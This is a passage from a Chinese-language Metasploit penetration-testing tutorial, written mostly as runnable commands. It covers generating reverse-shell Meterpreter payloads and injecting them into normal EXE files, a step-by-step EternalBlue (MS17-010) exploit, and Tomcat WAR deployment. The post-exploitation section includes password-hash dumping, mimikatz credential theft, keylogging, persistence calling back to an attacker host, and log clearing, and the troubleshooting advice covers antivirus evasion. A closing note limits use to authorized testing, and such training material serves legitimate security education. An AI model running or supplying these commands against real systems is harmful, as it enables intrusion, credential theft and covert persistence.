
# Hex格式
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f hex

# Num格式（十六进制数组）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f num
```

### 10.9.9 使用模板注入

```bash
# 操作位置：终端
# 注入到正常EXE中
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -x normal.exe -f exe -o infected.exe

# 注入到正常EXE并保持原程序功能
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -x normal.exe -k -f exe -o infected.exe
```

### 10.9.10 常见问题

**问题1：生成的Payload被查杀**

```
解决方法：
1. 使用编码器多次编码
2. 使用模板注入
3. 修改特征码
4. 使用自定义加密
```

---

## 10.10 实战案例

### 10.10.1 MS17-010 漏洞利用

**环境准备**：
- 目标：Windows 7 SP1 x64（192.168.1.100）
- 攻击机：Kali Linux（192.168.1.10）

**步骤1：启动msfconsole**

```bash
# 操作位置：Kali终端
msfconsole
```

**步骤2：搜索MS17-010模块**

```bash
# 操作位置：msfconsole
msf6 > search ms17-010
# 预期输出：显示MS17-010相关模块
```

**步骤3：使用永恒蓝模块**

```bash
# 操作位置：msfconsole
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

**步骤4：查看选项**

```bash
# 操作位置：msfconsole
msf6 > show options
```

**步骤5：设置目标**

```bash
# 操作位置：msfconsole
msf6 > set RHOSTS 192.168.1.100
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.10
msf6 > set LPORT 4444
```

**步骤6：检查目标**

```bash
# 操作位置：msfconsole
msf6 > check
# 预期输出：显示目标是否漏洞
```

**步骤7：执行攻击**

```bash
# 操作位置：msfconsole
msf6 > exploit
# 预期输出：成功获取Meterpreter会话
```

**步骤8：验证**

```bash
# 操作位置：Meterpreter会话
meterpreter > getuid
# 预期输出：Server username: NT AUTHORITY\SYSTEM
```

### 10.10.2 Tomcat Manager 部署War包

```bash
# 操作位置：msfconsole
# 1. 搜索Tomcat模块
msf6 > search tomcat mgr

# 2. 使用部署模块
msf6 > use exploit/multi/http/tomcat_mgr_deploy

# 3. 设置参数
msf6 > set RHOSTS 192.168.1.100
msf6 > set RPORT 8080
msf6 > set HttpUsername tomcat
msf6 > set HttpPassword tomcat
msf6 > set PAYLOAD java/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.10
msf6 > set LPORT 4444

# 4. 执行
msf6 > exploit
```

### 10.10.3 后渗透操作

```bash
# 操作位置：Meterpreter会话
# 1. 获取系统信息
meterpreter > sysinfo

# 2. 查看当前用户
meterpreter > getuid

# 3. 尝试获取System权限
meterpreter > getsystem

# 4. 导出密码哈希
meterpreter > hashdump

# 5. 加载mimikatz
meterpreter > load mimikatz

# 6. 获取明文密码
meterpreter > creds_all

# 7. 查看进程
meterpreter > ps

# 8. 迁移到系统进程
meterpreter > migrate 1234

# 9. 键盘记录
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# 10. 截图
meterpreter > screenshot

# 11. 持久化
meterpreter > run persistence -X -i 30 -p 4444 -r 192.168.1.10

# 12. 清除日志
meterpreter > clearev
```

---

## 10.11 常见问题与排错

### 10.11.1 安装问题

**问题1：bundle install失败**

```
可能原因：
- 依赖库缺失
- Ruby版本不兼容
- 网络问题

解决方法：
1. 安装依赖库：
   sudo apt-get install -y libpq-dev libpcap-dev libsqlite3-dev zlib1g-dev
2. 使用国内gem源：
   gem sources --add https://gems.ruby-china.com/ --remove https://rubygems.org/
   bundle config mirror.https://rubygems.org https://gems.ruby-china.com
```

**问题2：数据库连接失败**

```
解决方法：
1. 检查PostgreSQL是否启动：
   sudo systemctl status postgresql
2. 检查数据库用户和密码是否正确
3. 检查database.yml配置
```

### 10.11.2 漏洞利用问题

**问题1：漏洞利用失败**

```
可能原因：
- 目标系统已打补丁
- 系统架构不匹配（x86/x64）
- Payload选择不正确
- 网络连接被防火墙阻止

解决方法：
1. 使用check命令确认漏洞存在
2. 确认目标系统版本和架构
3. 尝试不同的Payload
4. 检查网络连接
```

**问题2：Meterpreter会话连接不上**

```
可能原因：
- 防火墙阻止了出站连接
- LHOST设置不正确
- 目标无法访问攻击机

解决方法：
1. 确保LHOST是目标可以访问的IP
2. 检查防火墙设置
3. 尝试使用reverse_https等其他Payload
```

### 10.11.3 Meterpreter问题

**问题1：Meterpreter会话经常断开**

```
可能原因：
- 网络不稳定
- 进程被杀死
- Payload被杀毒软件查杀

解决方法：
1. 迁移到稳定的系统进程
2. 使用编码和注入绕过杀软
3. 使用更稳定的传输方式
```

**问题2：getsystem失败**

```
可能原因：
- 当前权限不足
- 系统补丁导致方法失效

解决方法：
1. 使用其他提权方法
2. 尝试绕过UAC
3. 使用本地提权漏洞模块
```

---

## 10.12 安全注意事项

1. **授权测试**：只对授权的目标进行测试
2. **遵守法律**：遵守当地法律法规
3. **数据保护**：保护获取的敏感数据
4. **影响控制**：避免对目标系统造成损害
5. **报告漏洞**：测试后及时报告漏洞和修复建议

---

## 10.13 本章小结

本章详细介绍了Metasploit渗透框架的使用，包括：

1. **Metasploit简介**：发展历史、版本和特点
2. **安装部署**：多种系统下的安装方法
3. **数据库配置**：PostgreSQL数据库的配置和使用
4. **模块体系**：Auxiliary、Exploit、Payload、Post、Encoder、NOP六大模块
5. **基本使用流程**：从信息收集到漏洞利用的完整流程
6. **常用命令**：核心命令、模块操作、会话管理、数据库命令
7. **Meterpreter**：文件系统、进程、网络、系统操作等
8. **后渗透模块**：信息收集、权限提升、凭证获取、横向移动、持久化
9. **Msfvenom**：各种Payload生成方法
10. **实战案例**：MS17-010、Tomcat部署、后渗透操作
11. **常见问题**：安装、漏洞利用、Meterpreter等常见问题

Metasploit是一个非常强大的工具，但要真正掌握它需要大量的实践。建议读者在授权的环境中多加练习，深入理解每个模块的原理和使用方法。
